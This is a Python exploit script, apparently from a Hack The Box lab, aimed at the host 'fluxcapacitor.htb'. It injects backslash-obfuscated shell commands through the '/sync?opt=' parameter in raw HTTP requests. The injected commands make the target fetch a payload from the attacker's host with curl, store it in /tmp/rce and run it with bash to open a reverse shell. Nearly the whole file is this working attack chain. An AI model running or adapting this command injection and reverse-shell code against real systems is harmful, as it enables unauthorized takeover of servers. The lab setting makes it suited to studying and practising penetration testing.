#!/usr/bin/python3

import socket
import traceback
import sys
import argparse

def RevShell(lhost):
    target_host = "fluxcapacitor.htb"
    target_port = 80
    
    try:
        print("[*] Please edit and host the index.html on port 8080")
        print("[*] Uploading backdoor...")
        
        # First request - upload backdoor
        path1 = f"/sync?opt=' cur\\l {lhost}:8080 -o /tmp/rce'"
        request1 = f"GET {path1} HTTP/1.1\r\n"
        request1 += f"Host: {target_host}\r\n"
        request1 += "User-Agent: TheLongerWeDelayTheMoreWePay\r\n"
        request1 += "Connection: close\r\n\r\n"
        
        sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock1.connect((target_host, target_port))
        sock1.send(request1.encode())
        response1 = sock1.recv(4096)
        sock1.close()
        
        # Second request - check if backdoor exists
        path2 = f"/sync?opt=' l\\s /tmp/rce'"
        request2 = f"GET {path2} HTTP/1.1\r\n"
        request2 += f"Host: {target_host}\r\n"
        request2 += "User-Agent: TheLongerWeDelayTheMoreWePay\r\n"
        request2 += "Connection: close\r\n\r\n"
        
        sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock2.connect((target_host, target_port))
        sock2.send(request2.encode())
        response2 = sock2.recv(4096).decode('utf-8')
        sock2.close()
        
        if "/tmp/rce" in response2:
            print("[+] Backdoor uploaded successfully")
            print("[*] Triggering the Reverse Shell, check your listener!")
            
            # Third request - trigger reverse shell
            path3 = f"/sync?opt=' ba\\s\\h /tmp/rce'"
            request3 = f"GET {path3} HTTP/1.1\r\n"
            request3 += f"Host: {target_host}\r\n"
            request3 += "User-Agent: TheLongerWeDelayTheMoreWePay\r\n"
            request3 += "Connection: close\r\n\r\n"
            
            sock3 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock3.connect((target_host, target_port))
            sock3.send(request3.encode())
            response3 = sock3.recv(4096)
            sock3.close()
            
            print("[+] Reverse Shell triggered successfully!")
        else:
            print("[-] Failed to upload the backdoor")
            sys.exit(1)
            
    except Exception as e:
        print("Error: ", e)
        traceback.print_exc()

def main():
    parser = argparse.ArgumentParser(description="Upload backdoor to the target machine")
    parser.add_argument("lhost", help="Listener IP address")
    args = parser.parse_args()

    RevShell(args.lhost)

    # Example Usage:
    # python3 rce_script.py 10.10.16.6

if __name__ == "__main__":
    main()
